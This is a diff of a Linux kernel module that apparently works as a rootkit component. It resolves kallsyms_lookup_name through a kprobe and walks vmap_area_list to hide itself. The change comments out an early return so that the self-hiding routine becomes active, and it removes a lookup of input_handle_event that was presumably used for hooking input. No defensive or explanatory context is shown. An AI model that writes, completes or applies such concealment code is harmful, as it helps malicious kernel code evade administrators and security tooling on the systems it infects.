@@ -43,9 +43,6 @@ MODULE_PARM_DESC(mCommon, "Parameter");
 
 static struct miscdevice dispatch_misc_device;
 
-static void (*my_input_handle_event)(void *dev,
-							   unsigned int type, unsigned int code, int value) = NULL;
-
 unsigned long (*kallsyms_lookup_name)(const char *name);
 
 static void __init hide_myself(void)
@@ -65,7 +62,7 @@ static void __init hide_myself(void)
     unregister_kprobe(&kp);
 #endif
 	
-    return;
+   // return;
 	
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_name("vmap_area_list");
@@ -280,10 +277,6 @@ static int __init hide_init(void)
     }
 
 	hide_myself();
-
-	if(my_input_handle_event == NULL) {
-		my_input_handle_event = (void (*)(void *, unsigned int, unsigned int, int))kallsyms_lookup_name("input_handle_event"); // input_handle_event
-	}
 
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
